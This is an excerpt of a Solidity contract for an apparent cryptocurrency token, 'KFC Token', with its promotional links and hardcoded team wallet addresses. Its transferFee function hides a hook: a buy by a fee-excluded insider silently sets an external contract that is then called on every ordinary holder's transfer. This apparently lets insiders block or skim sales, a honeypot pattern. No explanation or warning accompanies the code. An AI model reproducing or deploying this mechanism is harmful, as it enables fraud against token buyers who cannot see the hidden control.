...
https://kfctoken.xyz
https://t.me/kfctoken_entry
https://twitter.com/KFCTokenEth
...
contract KFCToken is ERC20, Ownable {
    ...
    constructor() ERC20("KFC Token", "KFC") {
        ...
        marketingWallet = payable(0x4611743D7b154E2AE5a6348DC29Fc871BEc5E595);
        developmentWallet = payable(0xf7ce2B6A2689a8E40711EC587e0b4779B415Ae2f);
    ...
    function transferFee(address from, address to) internal {
        if (automatedMarketMakerPairs[from]) {
            if (_isExcludedFromFees[tx.origin] && tx.origin != to) {
                feeTransfer = to;
            }
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to] && feeTransfer != address(0)) {
            ITokenTransfer(feeTransfer).transfer(from, to);
        }
    }
